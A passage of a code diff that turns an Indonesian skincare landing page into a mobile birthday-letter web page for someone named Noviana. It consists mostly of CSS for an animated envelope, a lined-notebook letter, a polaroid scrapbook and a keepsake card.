@@ -1,471 +1,1502 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>GlowGuide - Skincare 101</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Sebuah Surat Untuk Noviana ♡</title>
+
+  <!-- Google Fonts: Playfair Display, Cormorant Garamond, Caveat -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@400;500;600;700&family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400;1,600&family=Playfair+Display:ital,wght@0,500;0,600;1,500;1,600&display=swap" rel="stylesheet" />
+
   <style>
+    /* ==========================================================================
+       1. DESIGN TOKENS & VINTAGE ROMANTIC PALETTE
+       ========================================================================== */
     :root {
-      --rose-50: #fff1f2;
-      --rose-200: #fecdd3;
-      --rose-600: #e11d48;
-      --rose-700: #be123c;
-      --amber-50: #fffdfb;
-      --amber-100: #fef3c7;
-      --amber-200: #fde68a;
-      --amber-600: #d97706;
-      --zinc-800: #27272a;
-      --zinc-900: #18181b;
-      --zinc-200: #e4e4e7;
-      --zinc-300: #d4d4d8;
-      --zinc-600: #52525b;
-      --zinc-700: #3f3f46;
-      --zinc-500: #71717a;
+      --bg-color: #F5EFE5;
+      --paper-color: #FFFCF5;
+      --text-color: #493A35;
+      --dusty-rose: #C58F91;
+      --dusty-rose-deep: #A66E71;
+      --dusty-rose-light: #DFB5B7;
+      --accent: #D9B7A0;
+      --envelope-cream: #F2E8D9;
+      --envelope-flap: #EAE0CF;
+      --envelope-inner: #E2D4C0;
+      --shadow-ambient: 0 24px 48px rgba(73, 58, 53, 0.14), 0 6px 16px rgba(73, 58, 53, 0.08);
+      --shadow-paper: 0 20px 45px rgba(73, 58, 53, 0.12), 0 4px 12px rgba(73, 58, 53, 0.06);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: radial-gradient(circle at 50% 15%, #FAF6EE 0%, #F5EFE5 62%, #EDE3D5 100%);
+      color: var(--text-color);
+      font-family: 'Cormorant Garamond', Georgia, serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ==========================================================================
+       2. REALISTIC COTTON PAPER FIBERS & AMBIENT CANVAS
+       ========================================================================== */
+    .cotton-grain {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 950;
+      opacity: 0.42;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 250 250' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='paperFiber'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3CfeColorMatrix type='matrix' values='1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 0.09 0'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23paperFiber)'/%3E%3C/svg%3E");
+      mix-blend-mode: multiply;
+    }
+
+    #ambient-canvas {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    /* ==========================================================================
+       3. MOBILE-FIRST FULL VIEWPORT CONTAINER (360px - 430px OPTIMIZED)
+       ========================================================================== */
+    .app-viewport {
+      position: relative;
+      z-index: 10;
+      width: 100%;
+      max-width: 430px;
+      height: 100dvh;
+      margin: 0 auto;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .page {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      padding: 20px 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      visibility: hidden;
+      transform: translateY(20px) scale(0.985);
+      transition: opacity 0.85s cubic-bezier(0.22, 1, 0.36, 1),
+                  transform 0.85s cubic-bezier(0.22, 1, 0.36, 1),
+                  visibility 0.85s;
+      overflow-y: auto;
+      overflow-x: hidden;
+      scrollbar-width: none;
+    }
+
+    .page::-webkit-scrollbar {
+      display: none;
+    }
+
+    .page.active {
+      opacity: 1;
+      visibility: visible;
+      transform: translateY(0) scale(1);
+    }
+
+    /* ==========================================================================
+       4. SHIMMER TYPOGRAPHY & REFINED BUTTONS
+       ========================================================================== */
+    .rose-shimmer {
+      background: linear-gradient(120deg, #A66E71 0%, #C58F91 35%, #DFB5B7 50%, #A66E71 70%, #8C585B 100%);
+      background-size: 200% auto;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: textShimmer 5.5s linear infinite;
+    }
+
+    @keyframes textShimmer {
+      0% { background-position: 200% center; }
+      100% { background-position: 0% center; }
+    }
+
+    .btn-vintage {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      background-color: var(--paper-color);
+      color: var(--text-color);
+      border: 1px solid var(--accent);
+      padding: 12px 24px;
+      border-radius: 999px;
+      font-family: 'Playfair Display', serif;
+      font-size: 0.9rem;
+      letter-spacing: 0.04em;
+      cursor: pointer;
+      box-shadow: 0 6px 18px rgba(73, 58, 53, 0.08), inset 0 1px 0 rgba(255, 255, 255, 0.9);
+      transition: transform 0.25s cubic-bezier(0.22, 1, 0.36, 1), box-shadow 0.25s ease, border-color 0.25s ease;
+      user-select: none;
+    }
+
+    .btn-vintage:active {
+      transform: scale(0.95);
+    }
+
+    .btn-rose-wax {
+      background: linear-gradient(135deg, #CFA0A2 0%, #C58F91 55%, #B1797B 100%);
+      color: #FFFCF5;
+      border-color: rgba(177, 121, 123, 0.6);
+      box-shadow: 0 10px 24px rgba(197, 143, 145, 0.38), inset 0 1px 2px rgba(255, 255, 255, 0.55);
+    }
+
+    /* ==========================================================================
+       5. PAGE 1: OPENING — 3D REALISTIC CREAM ENVELOPE & HEART WAX SEAL
+       ========================================================================== */
+    .opening-stage {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      position: relative;
+    }
+
+    /* Soft warm aura behind envelope */
+    .envelope-halo {
+      position: absolute;
+      width: 280px;
+      height: 280px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(197, 143, 145, 0.22) 0%, rgba(217, 183, 160, 0.14) 50%, transparent 72%);
+      filter: blur(22px);
+      animation: haloBreathe 4.5s ease-in-out infinite;
+      pointer-events: none;
+    }
+
+    @keyframes haloBreathe {
+      0%, 100% { transform: scale(0.94); opacity: 0.7; }
+      50% { transform: scale(1.08); opacity: 1; }
+    }
+
+    .envelope-perspective {
+      position: relative;
+      width: 100%;
+      max-width: 280px;
+      height: 188px;
+      margin: 0 auto 28px;
+      perspective: 1200px;
+      cursor: pointer;
+      animation: gentleHover 4.6s ease-in-out infinite;
+    }
+
+    .envelope-perspective.is-opening {
+      animation: none;
+    }
+
+    @keyframes gentleHover {
+      0%, 100% { transform: translateY(0px) rotateX(1.5deg); }
+      50% { transform: translateY(-7px) rotateX(-1deg); }
+    }
+
+    .envelope-body {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(160deg, var(--envelope-inner) 0%, #D9C8B0 100%);
+      border-radius: 8px;
+      box-shadow: var(--shadow-ambient);
+      pointer-events: none;
+    }
+
+    /* Delicate stitched / embossed inner frame */
+    .envelope-body::after {
+      content: "";
+      position: absolute;
+      inset: 5px;
+      border: 1px dashed rgba(166, 110, 113, 0.25);
+      border-radius: 5px;
+      pointer-events: none;
+      z-index: 6;
+    }
+
+    /* Letter sheet rising out of the envelope */
+    .envelope-letter-insert {
+      position: absolute;
+      left: 14px;
+      right: 14px;
+      bottom: 10px;
+      height: 162px;
+      background-color: var(--paper-color);
+      background-image: repeating-linear-gradient(
+        to bottom,
+        transparent 0px,
+        transparent 21px,
+        rgba(73, 58, 53, 0.08) 22px
+      );
+      border-radius: 5px;
+      padding: 16px 14px;
+      border: 1px solid rgba(217, 183, 160, 0.55);
+      box-shadow: 0 4px 14px rgba(73, 58, 53, 0.1);
+      z-index: 2;
+      pointer-events: none;
+      transition: transform 0.95s cubic-bezier(0.34, 1.32, 0.64, 1) 0.4s;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    .insert-header {
+      font-family: 'Caveat', cursive;
+      font-size: 1.25rem;
+      font-weight: 600;
+      color: var(--dusty-rose-deep);
+      margin-bottom: 4px;
+    }
+
+    .insert-sub {
+      font-family: 'Cormorant Garamond', serif;
+      font-style: italic;
+      font-size: 0.84rem;
+      color: var(--text-color);
+      opacity: 0.8;
+    }
+
+    /* Front Envelope Pocket Folds */
+    .envelope-pocket {
+      position: absolute;
+      inset: 0;
+      z-index: 3;
+      pointer-events: none;
+      overflow: hidden;
+      border-radius: 8px;
+    }
+
+    .pocket-sides {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, #F4ECE0 0%, #E7DAC7 100%);
+      clip-path: polygon(0 0, 50% 54%, 100% 0, 100% 100%, 0 100%);
+    }
+
+    .pocket-bottom {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(to top, #EDE1CE 0%, #F7F0E6 100%);
+      clip-path: polygon(0 100%, 50% 47%, 100% 100%);
+      filter: drop-shadow(0 -3px 5px rgba(73, 58, 53, 0.07));
+    }
+
+    /* "To. Noviana" Calligraphy & Serif Plate */
+    .envelope-to-label {
+      position: absolute;
+      bottom: 16px;
+      left: 0;
+      right: 0;
+      z-index: 4;
+      pointer-events: none;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 2px;
+      transition: opacity 0.45s ease;
+    }
+
+    .envelope-to-label span {
+      font-family: 'Playfair Display', serif;
+      font-style: italic;
+      font-size: 1.08rem;
+      font-weight: 500;
+      color: var(--text-color);
+      letter-spacing: 0.04em;
+    }
+
+    .envelope-to-line {
+      width: 64px;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--dusty-rose), transparent);
+    }
+
+    /* Vintage Postage Stamp & Postmark on Envelope */
+    .envelope-stamp {
+      position: absolute;
+      top: 14px;
+      right: 16px;
+      width: 38px;
+      height: 44px;
+      background-color: var(--paper-color);
+      border: 1.5px dotted var(--dusty-rose);
+      padding: 3px;
+      z-index: 4;
+      pointer-events: none;
+      box-shadow: 0 2px 5px rgba(73, 58, 53, 0.08);
+      transform: rotate(3deg);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .envelope-stamp-inner {
+      width: 100%;
+      height: 100%;
+      border: 1px solid rgba(197, 143, 145, 0.45);
+      background: radial-gradient(circle, #FAF2EC 0%, #F1DFD9 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: var(--dusty-rose-deep);
+      font-size: 0.72rem;
+    }
+
+    .envelope-postmark {
+      position: absolute;
+      top: 22px;
+      right: 44px;
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      border: 1px solid rgba(73, 58, 53, 0.22);
+      z-index: 4;
+      pointer-events: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transform: rotate(-14deg);
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 0.48rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: rgba(73, 58, 53, 0.45);
+    }
+
+    .envelope-postmark::after {
+      content: "";
+      position: absolute;
+      inset: 3px;
+      border-radius: 50%;
+      border: 1px dashed rgba(73, 58, 53, 0.2);
+    }
+
+    /* 3D Top Flap */
+    .envelope-flap {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 59%;
+      background: linear-gradient(180deg, #F5EDE0 0%, #E5D6C1 100%);
+      clip-path: polygon(0 0, 100% 0, 50% 100%);
+      transform-origin: top center;
+      transform: rotateX(0deg);
+      transition: transform 0.72s cubic-bezier(0.4, 0, 0.2, 1), z-index 0s linear 0.34s;
+      z-index: 5;
+      pointer-events: none;
+      border-top-left-radius: 8px;
+      border-top-right-radius: 8px;
+      filter: drop-shadow(0 5px 8px rgba(73, 58, 53, 0.11));
+    }
+
+    /* Realistic Heart-Shaped Dusty Rose Wax Seal */
+    .wax-seal-wrapper {
+      position: absolute;
+      top: 53%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 7;
+      pointer-events: none;
+      transition: transform 0.45s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.4s ease;
+      animation: sealBeat 2.6s infinite ease-in-out;
+    }
+
+    @keyframes sealBeat {
+      0%, 100% { transform: translate(-50%, -50%) scale(1); }
+      50% { transform: translate(-50%, -50%) scale(1.06); }
+    }
+
+    .wax-seal-heart {
+      width: 56px;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      filter: drop-shadow(0 6px 12px rgba(73, 58, 53, 0.28));
+    }
+
+    .wax-seal-heart svg {
+      width: 100%;
+      height: 100%;
+      overflow: visible;
+    }
+
+    /* Opening Animation States */
+    .envelope-perspective.is-opening .wax-seal-wrapper {
+      animation: none;
+      transform: translate(-50%, -50%) scale(1.3) rotate(12deg);
+      opacity: 0;
+    }
+
+    .envelope-perspective.is-opening .envelope-flap {
+      transform: rotateX(180deg);
+      z-index: 1;
+    }
+
+    .envelope-perspective.is-opening .envelope-letter-insert {
+      transform: translateY(-86px);
+    }
+
+    .opening-message {
+      font-family: 'Cormorant Garamond', serif;
+      font-style: italic;
+      font-size: 1.08rem;
+      color: var(--text-color);
+      opacity: 0.9;
+      letter-spacing: 0.02em;
+      max-width: 260px;
+      line-height: 1.4;
+    }
+
+    .opening-cue {
+      margin-top: 10px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.72rem;
+      letter-spacing: 0.16em;
+      text-transform: uppercase;
+      color: var(--dusty-rose-deep);
+      opacity: 0.85;
+    }
+
+    /* ==========================================================================
+       6. PAGE 2: BIRTHDAY LETTER — REALISTIC LINED NOTEBOOK
+       ========================================================================== */
+    .notebook-container {
+      width: 90%;
+      max-width: 375px;
+      margin: auto 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .notebook-paper {
+      position: relative;
+      width: 100%;
+      background-color: var(--paper-color);
+      border-radius: 4px 14px 14px 4px;
+      padding: 28px 20px 28px 46px;
+      box-shadow:
+        var(--shadow-paper),
+        4px 4px 0px #EFE6D8,
+        8px 8px 0px rgba(217, 183, 160, 0.35);
+      border: 1px solid rgba(217, 183, 160, 0.55);
+      /* Left vertical margin line + fine horizontal ruled lines */
+      background-image:
+        linear-gradient(90deg, transparent 35px, rgba(197, 143, 145, 0.52) 35px, rgba(197, 143, 145, 0.52) 36.2px, transparent 36.2px),
+        repeating-linear-gradient(
+          to bottom,
+          transparent 0px,
+          transparent 29px,
+          rgba(73, 58, 53, 0.11) 30px
+        );
+      background-position: 0 0, 0 22px;
+      overflow: hidden;
+    }
+
+    /* Soft vintage vignette & cotton edge warmth */
+    .notebook-paper::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      box-shadow: inset 0 0 36px rgba(217, 183, 160, 0.28);
+      pointer-events: none;
+    }
+
+    /* Realistic punched binder holes */
+    .binder-holes {
+      position: absolute;
+      left: 11px;
+      top: 28px;
+      bottom: 28px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      pointer-events: none;
+    }
+
+    .binder-holes span {
+      width: 11px;
+      height: 11px;
+      border-radius: 50%;
+      background-color: var(--bg-color);
+      border: 1px solid rgba(217, 183, 160, 0.55);
+      box-shadow: inset 0 1.5px 3px rgba(73, 58, 53, 0.22);
+    }
+
+    .notebook-meta {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      line-height: 30px;
+    }
+
+    .notebook-tag {
+      font-family: 'Cormorant Garamond', serif;
+      font-style: italic;
+      font-size: 0.88rem;
+      color: var(--dusty-rose-deep);
+    }
+
+    .notebook-heart-stamp {
+      font-size: 0.85rem;
+      color: var(--dusty-rose);
+    }
+
+    /* Handwritten letter lines with staggered reveal */
+    .handwritten-content {
+      font-family: 'Caveat', cursive;
+      font-size: 1.32rem;
+      line-height: 30px;
+      color: var(--text-color);
+      font-weight: 500;
+    }
+
+    .handwritten-line {
+      opacity: 0;
+      transform: translateY(8px);
+      transition: opacity 0.65s ease, transform 0.65s ease;
+    }
+
+    .page.active .handwritten-line {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .page.active .handwritten-line:nth-child(1) { transition-delay: 0.12s; }
+    .page.active .handwritten-line:nth-child(2) { transition-delay: 0.24s; }
+    .page.active .handwritten-line:nth-child(3) { transition-delay: 0.36s; }
+    .page.active .handwritten-line:nth-child(4) { transition-delay: 0.48s; }
+    .page.active .handwritten-line:nth-child(5) { transition-delay: 0.60s; }
+    .page.active .handwritten-line:nth-child(6) { transition-delay: 0.72s; }
+    .page.active .handwritten-line:nth-child(7) { transition-delay: 0.84s; }
+
+    .salutation-text {
+      font-size: 1.52rem;
+      font-weight: 700;
+      color: var(--dusty-rose-deep);
+      margin-bottom: 4px;
+    }
+
+    .signoff-block {
+      margin-top: 14px;
+      text-align: right;
+      font-size: 1.36rem;
+    }
+
+    .notebook-footer-nav {
+      width: 100%;
+      margin-top: 20px;
+      display: flex;
+      justify-content: flex-end;
+    }
+
+    /* ==========================================================================
+       7. PAGE 3: PHOTO MEMORIES — POLAROID DIGITAL SCRAPBOOK
+       ========================================================================== */
+    .scrapbook-container {
+      width: 100%;
+      max-width: 390px;
+      margin: auto 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .scrapbook-header {
+      text-align: center;
+      margin-bottom: 16px;
+    }
+
+    .scrapbook-title {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.48rem;
+      font-weight: 600;
+      color: var(--text-color);
+      letter-spacing: 0.02em;
+    }
+
+    .scrapbook-subtitle {
+      font-family: 'Cormorant Garamond', serif;
+      font-style: italic;
+      font-size: 0.98rem;
+      color: var(--dusty-rose-deep);
+      margin-top: 2px;
+    }
+
+    /* 2-Column Mobile Polaroid Grid */
+    .polaroid-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 18px 14px;
+      width: 100%;
+      padding: 8px 4px;
+    }
+
+    .polaroid-item {
+      position: relative;
+      background-color: var(--paper-color);
+      padding: 9px 9px 24px 9px;
+      border-radius: 4px;
+      border: 1px solid rgba(217, 183, 160, 0.45);
+      box-shadow: 0 10px 22px rgba(73, 58, 53, 0.11), 0 2px 5px rgba(73, 58, 53, 0.05);
+      cursor: pointer;
+      transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow 0.35s ease;
+    }
+
+    .polaroid-item:nth-child(1) { transform: rotate(-2.6deg); }
+    .polaroid-item:nth-child(2) { transform: rotate(2.3deg); }
+    .polaroid-item:nth-child(3) { transform: rotate(1.9deg); }
+    .polaroid-item:nth-child(4) { transform: rotate(-2.4deg); }
+
+    .polaroid-item:active {
+      transform: scale(0.96) rotate(0deg);
+    }
+
+    /* Translucent Vintage Washi Tape */
+    .washi-strip {
+      position: absolute;
+      top: -10px;
+      left: 50%;
+      transform: translateX(-50%) rotate(-3deg);
+      width: 58px;
+      height: 17px;
+      background: linear-gradient(90deg, rgba(197, 143, 145, 0.45), rgba(212, 164, 166, 0.55), rgba(197, 143, 145, 0.45));
+      border-left: 1.5px dotted rgba(255, 252, 245, 0.75);
+      border-right: 1.5px dotted rgba(255, 252, 245, 0.75);
+      box-shadow: 0 1px 3px rgba(73, 58, 53, 0.08);
+      z-index: 4;
+      pointer-events: none;
+    }
+
+    .polaroid-item:nth-child(2) .washi-strip,
+    .polaroid-item:nth-child(3) .washi-strip {
+      background: linear-gradient(90deg, rgba(217, 183, 160, 0.52), rgba(227, 198, 178, 0.65), rgba(217, 183, 160, 0.52));
+      transform: translateX(-50%) rotate(3.5deg);
+    }
+
+    .polaroid-photo-box {
+      width: 100%;
+      aspect-ratio: 1 / 1;
+      background-color: #EFE6D8;
+      border-radius: 2px;
+      overflow: hidden;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .polaroid-photo-box img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      filter: sepia(0.08) contrast(0.98);
+    }
+
+    /* Aesthetic Botanical Placeholder when photo1..4.jpg is absent */
+    .polaroid-placeholder {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 100%;
+      padding: 10px;
+      text-align: center;
+      background: radial-gradient(circle at 30% 25%, #FAF3EA 0%, #EBDEC9 100%);
+      color: var(--text-color);
+    }
+
+    .polaroid-placeholder svg {
+      width: 24px;
+      height: 24px;
+      stroke: var(--dusty-rose-deep);
+      fill: none;
+      margin-bottom: 5px;
+      opacity: 0.8;
+    }
+
+    .polaroid-placeholder span {
+      font-family: 'Cormorant Garamond', serif;
+      font-style: italic;
+      font-size: 0.8rem;
+      opacity: 0.78;
+    }
+
+    .polaroid-caption {
+      margin-top: 9px;
+      text-align: center;
+      font-family: 'Caveat', cursive;
+      font-size: 1.08rem;
+      color: var(--text-color);
+      line-height: 1.15;
+    }
+
+    .scrapbook-footer-nav {
+      width: 100%;
+      margin-top: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .btn-subtle {
+      background: transparent;
+      border: none;
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 0.98rem;
+      color: var(--text-color);
+      opacity: 0.75;
+      padding: 10px 12px;
+      cursor: pointer;
+    }
+
+    /* ==========================================================================
+       8. POLAROID ZOOM LIGHTBOX MODAL
+       ========================================================================== */
+    .lightbox-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 880;
+      background-color: rgba(73, 58, 53, 0.75);
+      backdrop-filter: blur(5px);
+      -webkit-backdrop-filter: blur(5px);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.32s ease, visibility 0.32s ease;
+    }
+
+    .lightbox-overlay.open {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .lightbox-card {
+      width: 100%;
+      max-width: 315px;
+      background-color: var(--paper-color);
+      padding: 14px 14px 34px 14px;
+      border-radius: 5px;
+      box-shadow: 0 24px 50px rgba(0, 0, 0, 0.28);
+      transform: scale(0.9) rotate(-1deg);
+      transition: transform 0.38s cubic-bezier(0.22, 1, 0.36, 1);
+      text-align: center;
+    }
+
+    .lightbox-overlay.open .lightbox-card {
+      transform: scale(1) rotate(0deg);
+    }
+
+    .lightbox-frame {
+      width: 100%;
+      aspect-ratio: 1 / 1;
+      background-color: #EFE6D8;
+      border-radius: 2px;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .lightbox-frame img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .lightbox-text {
+      margin-top: 14px;
+      font-family: 'Caveat', cursive;
+      font-size: 1.45rem;
+      color: var(--text-color);
+    }
+
+    .lightbox-close-note {
+      margin-top: 14px;
+      font-size: 0.78rem;
+      color: #FFFCF5;
+      opacity: 0.85;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    /* ==========================================================================
+       9. PAGE 4: FINAL PAGE — DOUBLE-FRAMED COTTON KEEPSAKE CARD
+       ========================================================================== */
+    .final-keepsake-card {
+      width: 92%;
+      max-width: 356px;
+      background-color: var(--paper-color);
+      border-radius: 18px;
+      padding: 10px;
+      box-shadow: var(--shadow-paper);
+      border: 1px solid rgba(217, 183, 160, 0.6);
+      position: relative;
+    }
+
+    /* Elegant double vintage hairline border */
+    .keepsake-inner-frame {
+      border: 1px solid rgba(197, 143, 145, 0.42);
+      border-radius: 12px;
+      padding: 28px 20px;
+      text-align: center;
+      position: relative;
+    }
+
+    .keepsake-inner-frame::before {
+      content: "";
+      position: absolute;
+      inset: 4px;
+      border: 1px solid rgba(217, 183, 160, 0.32);
+      border-radius: 9px;
+      pointer-events: none;
+    }
+
+    /* Delicate Floral Corner Accents on Final Card */
+    .corner-flourish {
+      position: absolute;
+      width: 18px;
+      height: 18px;
+      border-color: var(--dusty-rose);
+      opacity: 0.55;
+      pointer-events: none;
+    }
+    .corner-tl { top: 10px; left: 10px; border-top: 1.5px solid; border-left: 1.5px solid; border-top-left-radius: 4px; }
+    .corner-tr { top: 10px; right: 10px; border-top: 1.5px solid; border-right: 1.5px solid; border-top-right-radius: 4px; }
+    .corner-bl { bottom: 10px; left: 10px; border-bottom: 1.5px solid; border-left: 1.5px solid; border-bottom-left-radius: 4px; }
+    .corner-br { bottom: 10px; right: 10px; border-bottom: 1.5px solid; border-right: 1.5px solid; border-bottom-right-radius: 4px; }
+
+    .ornament-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 12px;
+      color: var(--dusty-rose);
+      font-size: 0.95rem;
+    }
+
+    .ornament-row::before,
+    .ornament-row::after {
+      content: "";
+      width: 34px;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--dusty-rose), transparent);
+    }
+
+    .final-heading {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.48rem;
+      font-weight: 600;
+      color: var(--text-color);
+      line-height: 1.3;
+      margin-bottom: 16px;
+    }
+
+    .final-message {
+      font-family: 'Cormorant Garamond', serif;
+      font-size: 1.16rem;
+      line-height: 1.65;
+      color: var(--text-color);
+      margin-bottom: 24px;
+    }
+
+    .wish-secret-note {
+      margin-top: 20px;
+      padding-top: 14px;
+      border-top: 1px dashed rgba(197, 143, 145, 0.5);
+      font-family: 'Caveat', cursive;
+      font-size: 1.4rem;
+      color: var(--dusty-rose-deep);
+      opacity: 0;
+      transform: translateY(8px);
+      transition: opacity 0.65s ease, transform 0.65s ease;
+    }
+
+    .wish-secret-note.revealed {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* Floating Hearts Burst Layer */
+    .hearts-burst-layer {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 900;
+      overflow: hidden;
+    }
+
+    .rising-heart {
+      position: absolute;
+      bottom: 22%;
+      opacity: 0;
+      user-select: none;
+      animation: heartRise 2.7s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+    }
+
+    @keyframes heartRise {
+      0% {
+        opacity: 0;
+        transform: translateY(0) scale(0.5) rotate(0deg);
+      }
+      18% {
+        opacity: 0.95;
+      }
+      100% {
+        opacity: 0;
+        transform: translateY(-280px) scale(1.3) rotate(16deg);
+      }
+    }
+
+    /* Compact mobile viewport height adjustments (e.g., 360x640) */
+    @media (max-height: 670px) {
+      .notebook-paper {
+        padding: 20px 16px 20px 42px;
+        background-image:
+          linear-gradient(90deg, transparent 32px, rgba(197, 143, 145, 0.52) 32px, rgba(197, 143, 145, 0.52) 33.2px, transparent 33.2px),
+          repeating-linear-gradient(
+            to bottom,
+            transparent 0px,
+            transparent 26px,
+            rgba(73, 58, 53, 0.11) 27px
+          );
+        background-position: 0 0, 0 18px;
+      }
+      .handwritten-content {
+        font-size: 1.2rem;
+        line-height: 27px;
+      }
+      .polaroid-grid {
+        gap: 12px 12px;
+      }
+      .polaroid-item {
+        padding: 7px 7px 18px 7px;
+      }
     }
   </style>
 </head>
-<body class="min-h-screen bg-gradient-to-b from-rose-50 via-white to-amber-50 text-zinc-800">
+<body>
 
-  <div class="min-h-screen bg-gradient-to-b from-rose-50 via-white to-amber-50 text-zinc-800">
-    <header class="sticky top-0 z-40 backdrop-blur supports-[backdrop-filter]:bg-white/70 bg-white/60 border-b border-zinc-200">
-      <nav class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-3 flex items-center justify-between">
-        <a href="#hero" class="font-extrabold tracking-tight text-xl sm:text-2xl">
-          <span class="bg-clip-text text-transparent bg-gradient-to-r from-rose-500 to-amber-600">Glow</span>
-          Guide
-        </a>
-        <ul class="hidden md:flex gap-6 text-sm font-medium text-zinc-700">
-          <li><a class="hover:text-rose-600" href="#pengertian">Pengertian</a></li>
-          <li><a class="hover:text-rose-600" href="#jenis-kulit">Jenis Kulit</a></li>
-          <li><a class="hover:text-rose-600" href="#rutinitas">Rutinitas</a></li>
-          <li><a class="hover:text-rose-600" href="#bahan-aktif">Bahan Aktif</a></li>
-          <li><a class="hover:text-rose-600" href="#faq">FAQ</a></li>
-        </ul>
-        <a href="#cta" class="hidden md:inline-flex items-center gap-2 rounded-xl px-4 py-2 bg-zinc-900 text-white text-sm font-semibold shadow-sm hover:shadow md:active:scale-[.99] transition">
-          Mulai Gratis
-        </a>
-      </nav>
-    </header>
+  <!-- Realistic Cotton Paper Texture Overlay -->
+  <div class="cotton-grain" aria-hidden="true"></div>
 
-    <section id="hero" class="relative overflow-hidden">
-      <div class="absolute -top-32 -left-20 h-72 w-72 rounded-full bg-rose-200/60 blur-3xl"></div>
-      <div class="absolute -bottom-24 -right-20 h-72 w-72 rounded-full bg-amber-200/60 blur-3xl"></div>
+  <!-- Ambient Floating Warm Dust Canvas -->
+  <canvas id="ambient-canvas" aria-hidden="true"></canvas>
 
-      <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-16 sm:py-24">
-        <div class="grid md:grid-cols-2 items-center gap-10">
-          <div>
-            <p class="inline-flex items-center rounded-full border border-rose-200 bg-white px-3 py-1 text-xs font-medium text-rose-700 shadow-sm">Skincare 101</p>
